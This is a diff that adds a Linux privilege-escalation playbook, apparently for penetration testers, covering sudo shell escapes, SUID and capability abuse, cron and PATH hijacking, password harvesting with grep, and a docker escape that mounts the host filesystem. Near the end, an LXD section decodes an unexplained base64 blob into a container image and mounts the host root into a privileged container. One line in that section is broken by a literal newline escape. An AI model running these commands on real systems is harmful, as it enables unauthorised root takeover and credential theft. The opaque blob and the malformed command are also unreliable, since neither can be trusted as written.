@@ -1,0 +1,220 @@
+# Linux Local Enumeration And Privilege Escalation
+
+## Goal
+
+Move from the current shell to a stronger account, ideally `root`, by following the fastest evidence-driven path instead of running every checklist blindly.
+
+## Why It Matters
+
+Linux local privilege escalation is the point where a foothold becomes full host compromise. The real value is not memorizing endless one-offs. It is knowing how to move quickly from a low-priv shell to the most likely misconfiguration or reusable secret.
+
+## First Five Minutes
+
+Start by understanding where you are:
+
+```bash
+id
+whoami
+hostname
+uname -a
+cat /etc/issue
+sudo -l
+```
+
+You want to know:
+
+- current user and groups
+- OS and kernel version
+- whether `sudo` gives you an immediate win
+
+## Workflow
+
+### 1. `sudo` Privileges
+
+This is usually the highest-value check.
+
+```bash
+sudo -l
+```
+
+If the user can run privileged programs, ask:
+
+- is there a direct shell escape?
+- can the allowed program read or write sensitive files?
+- can it execute another program?
+
+Examples:
+
+```bash
+sudo vim -c ':!/bin/sh'
+sudo find . -exec /bin/sh \; -quit
+```
+
+Check GTFOBins-style abuse paths for allowed binaries.
+
+### 2. SUID And SGID Binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+```
+
+Focus on:
+
+- unusual custom binaries
+- interpreters
+- file utilities that allow shell escapes
+
+Do not just list them. Test whether the binary gives:
+
+- file read access
+- file write access
+- shell execution
+- privilege retention
+
+### 3. Writable Files, Scripts, And Services
+
+```bash
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+ps aux
+cat /etc/systemd/system/*.service 2>/dev/null
+```
+
+Look for:
+
+- root-owned scripts you can modify
+- writable application directories executed by privileged services
+- custom service wrappers
+
+### 4. Cron Jobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron*
+```
+
+Ask:
+
+- what runs as root?
+- does the scheduled task call a writable script?
+- does it call a binary without an absolute path?
+
+If yes, consider script modification or path hijacking.
+
+### 5. PATH Hijacking
+
+```bash
+echo $PATH
+```
+
+This matters when a privileged script calls commands like `tar`, `cp`, or `python` without full paths. If a writable directory appears first in the path, you may be able to substitute your own executable.
+
+### 6. Credentials And Reusable Secrets
+
+```bash
+grep -Ri "password" /home 2>/dev/null
+grep -Ri "password" /var/www 2>/dev/null
+ls -la ~/.ssh
+```
+
+Check:
+
+- config files
+- shell history
+- web app credentials
+- private keys
+- backup files
+
+Sometimes the fastest escalation is not a local exploit. It is switching to another user.
+
+### 7. Capabilities
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+If a binary has dangerous capabilities such as `cap_setuid`, determine whether it can be used to spawn a privileged shell or read protected files.
+
+### 8. Containers And Special Groups
+
+```bash
+groups
+```
+
+If the user is in groups such as `docker`, test whether you can mount the host filesystem or start a privileged container:
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+### 9. NFS Misconfiguration
+
+```bash
+mount
+cat /etc/exports 2>/dev/null
+```
+
+If `no_root_squash` or similar unsafe export behavior exists, it may allow a SUID-based route to root.
+
+### 10. Kernel Exploits
+
+```bash
+uname -r
+```
+
+Kernel exploitation is a last resort. Use it only when:
+
+- simpler misconfigurations are exhausted
+- the target version is clearly vulnerable
+- the engagement rules allow it
+
+## Decision Logic
+
+Prefer this order:
+
+1. `sudo`
+2. obvious credential reuse
+3. writable privileged scripts or services
+4. SUID or capabilities abuse
+5. cron and path hijacking
+6. container or special group abuse
+7. kernel routes
+
+That order keeps you focused on the fastest practical wins.
+
+## Reporting Notes
+
+Capture:
+
+- the starting account
+- the exact misconfiguration
+- the commands that proved escalation
+- the resulting account or privilege level
+- whether the issue exposed sensitive data or full root access
+
+# LXD
+
+```bash
+echo 'QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng=' | base64 -d > bob.tar.bz2
+```
+```bash
+lxd init
+lxc image import bob.tar.bz2 --alias bobImage
+lxc init bobImage bobVM -c security.privileged=true
+lxc config device add bobVM realRoot disk source=/ path=r
+lxc exec bobVM -- /bin/sh\ncd /r
+ls
+```
+
+## Fast Checklist
+
+```text
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab
+ps aux
+getcap -r / 2>/dev/null
+groups
+grep -Ri password /home 2>/dev/null
+```
